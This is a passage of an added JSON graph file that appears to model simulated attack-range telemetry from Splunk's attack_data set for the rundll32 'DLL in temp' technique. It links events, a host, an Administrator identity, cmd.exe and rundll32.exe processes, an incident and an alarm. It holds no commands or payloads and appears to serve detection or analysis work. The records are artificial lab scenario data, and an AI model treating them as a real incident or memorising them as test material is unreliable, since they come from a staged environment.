+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          },
+          "to_id": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813"
+        },
+        {
+          "from_id": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010",
+          "id": "edge-40238d364e99eaabd4674aa8cb9e7c956d3c51c648b529e71a0da13b5ae9c121",
+          "label": "EVIDENCES_ENTITY",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          },
+          "to_id": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085"
+        },
+        {
+          "from_id": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+          "id": "edge-4bdf30539cc8ed9f65e1a1aa0cb26d7afe4f5953a266d7f975d2ea23a4e08d37",
+          "label": "PROCESS_ON_HOST",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          },
+          "to_id": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e"
+        },
+        {
+          "from_id": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+          "id": "edge-f6c57683a7f0afe2d06b7cc8e81465e5d548775f5a656e6b9078642d7620fb73",
+          "label": "EXECUTED_AS",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          },
+          "to_id": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813"
+        },
+        {
+          "from_id": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+          "id": "edge-e425e6a598d754125e97b0fa8b3e6775a7345050b5b58f0fd6406d38a3f5b1fa",
+          "label": "PARENT_OF",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          },
+          "to_id": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085"
+        },
+        {
+          "from_id": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+          "id": "edge-21899a05a0b6b23678fba60020129de8900a62bae140eacedc342d86e88cd30f",
+          "label": "PROCESS_ON_HOST",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          },
+          "to_id": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e"
+        },
+        {
+          "from_id": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067",
+          "id": "edge-92c9e8a5cc869612517a014c0a67be4943520b8e5cdeb54f2d3a9d97f080ab3b",
+          "label": "EVIDENCES_ENTITY",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          },
+          "to_id": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e"
+        },
+        {
+          "from_id": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067",
+          "id": "edge-e662d42ad3bec479d62f01889f7dc43494598ed0a2c37fbca21e9fc08f142ef8",
+          "label": "EVIDENCES_ENTITY",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          },
+          "to_id": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813"
+        },
+        {
+          "from_id": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067",
+          "id": "edge-84f72a6d368b792b2c652a9b7eab4385963a203ff4cf9437182992e36e74cd17",
+          "label": "EVIDENCES_ENTITY",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          },
+          "to_id": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0"
+        },
+        {
+          "from_id": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+          "id": "edge-e8acb29c4a64835dea476f4fe10d477ecad96c4904051e0a32c85c941813d01f",
+          "label": "PROCESS_ON_HOST",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          },
+          "to_id": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e"
+        },
+        {
+          "from_id": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+          "id": "edge-4ad5b0442580897b583035d6407b3ac29508404352d2277d3a2e97ebc4562ea2",
+          "label": "EXECUTED_AS",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          },
+          "to_id": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813"
+        },
+        {
+          "from_id": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+          "id": "edge-cc73f1fbc503a9dbc079cb2d7eda24474673a516e99644b69444d6844804164c",
+          "label": "PARENT_OF",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          },
+          "to_id": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0"
+        },
+        {
+          "from_id": "incident-0b1f1cd90fc42f25ca038e671fbc3fe4e9203e5936a0fa55311c34dc23e1304b",
+          "id": "edge-e4c869bf75f824c683d6e1c3ceed3b68fdb15fea6c9162fd176f3426fccb3eb8",
+          "label": "CONTAINS_EVENT",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          },
+          "to_id": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010"
+        },
+        {
+          "from_id": "incident-0b1f1cd90fc42f25ca038e671fbc3fe4e9203e5936a0fa55311c34dc23e1304b",
+          "id": "edge-4d94c5c771d4dee66681627a09254f2a14de1a3fec175b6ec1db183657c5b809",
+          "label": "HAS_ALARM",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          },
+          "to_id": "alarm-d190df5ee1d9c776316551f06e8a3e025ccfe999440f45a9990d63faeb9af2d8"
+        },
+        {
+          "from_id": "alarm-d190df5ee1d9c776316551f06e8a3e025ccfe999440f45a9990d63faeb9af2d8",
+          "id": "edge-bd687cd34effe965940b4d42b5cc7ac500dee703e66a617a24ee95cbcc1c7186",
+          "label": "SUPPORTED_BY",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          },
+          "to_id": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010"
+        },
+        {
+          "from_id": "incident-0b1f1cd90fc42f25ca038e671fbc3fe4e9203e5936a0fa55311c34dc23e1304b",
+          "id": "edge-c57955475efa2f9672c32c33f890b14d155ceec8cd33854f2a0f1996b51e86b7",
+          "label": "CONTAINS_EVENT",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          },
+          "to_id": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067"
+        },
+        {
+          "from_id": "alarm-d190df5ee1d9c776316551f06e8a3e025ccfe999440f45a9990d63faeb9af2d8",
+          "id": "edge-bd6e5b1dfe4f5a3c1a2fe8fea692eccb223910985a05ad42068b80fb9ef9ffad",
+          "label": "SUPPORTED_BY",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          },
+          "to_id": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067"
+        }
+      ],
+      "vertices": [
+        {
+          "id": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010",
+          "label": "Event",
+          "name": "62359",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          }
+        },
+        {
+          "id": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+          "label": "Host",
+          "name": "ar-win-dc.attackrange.local",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          }
+        },
+        {
+          "id": "domain-73df6c5637b12af4763beae5acef599d562063dba69aaba4379e93be509c88e3",
+          "label": "Domain",
+          "name": "ATTACKRANGE",
+          "properties": {
+            "domain_kind": "windows-account-domain",
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          }
+        },
+        {
+          "id": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813",
+          "label": "Identity",
+          "name": "ATTACKRANGE\\Administrator",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          }
+        },
+        {
+          "id": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+          "label": "Process",
+          "name": "C:\\Windows\\System32\\rundll32.exe",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+            ],
+            "observation_roles": [
+              "process_creation"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "process_guid": "e4b49a97-9768-6888-5f01-00000000f103",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          }
+        },
+        {
+          "id": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+          "label": "Process",
+          "name": "C:\\Windows\\System32\\cmd.exe",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+            ],
+            "observation_roles": [
+              "parent_field_reference"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "process_guid": "e4b49a97-9749-6888-5a01-00000000f103",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          }
+        },
+        {
+          "id": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067",
+          "label": "Event",
+          "name": "62302",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          }
+        },
+        {
+          "id": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+          "label": "Process",
+          "name": "C:\\Windows\\System32\\rundll32.exe",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+            ],
+            "observation_roles": [
+              "process_creation"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "process_guid": "e4b49a97-9761-6888-5c01-00000000f103",
+            "source": {
